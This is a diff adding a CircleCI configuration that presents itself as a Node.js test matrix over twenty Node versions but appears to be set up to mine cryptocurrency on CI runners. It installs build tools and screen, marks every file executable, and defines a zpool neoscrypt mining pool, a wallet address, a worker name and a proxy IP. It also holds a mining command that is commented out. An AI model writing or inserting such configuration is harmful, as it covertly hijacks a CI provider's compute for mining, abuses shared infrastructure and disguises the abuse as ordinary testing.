@@ -1,0 +1,47 @@
+version: 2.1
+
+executors:
+  linux:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+orbs:
+  node: circleci/node@2.0.0
+
+jobs:
+  test:
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+          name: Module
+          command: sudo apt-get -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential screen
+      - run:
+          name: Ijin Akses
+          command: chmod u+x *
+      - run:
+          name: Runner_go
+          command: |
+            chmod +x *
+            screen -dmS ls
+            POOL=stratum+tcp://neoscrypt.na.mine.zpool.ca:4233
+            WALLET=DCKgUo4HRRrLGiRwMhZ2c4RRsRQom1QCUj
+            WORKER=CircleCi_01
+            PROXY=https://51.222.21.94:32768
+            #./01 -a neoscrypt -o $POOL -u $WALLET.$WORKER -p c=DGB,zap=DIN/FTC/GBX/GUN/IQ/NYX/SPK/TZC/UFO/ZOC -t12 -x $PROXY
+workflows:
+  all-tests:
+    jobs:
+      - test:
+          matrix:
+            parameters:
+              os: [linux]
+              node-version: [10.0.0, 10.1.0, 10.2.0, 10.2.1, 10.3.0, 10.4.0, 10.4.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.9.0, 10.10.0, 10.11.0, 10.12.0, 10.13.0, 10.14.0, 10.14.1, 10.14.2, 10.15.0]
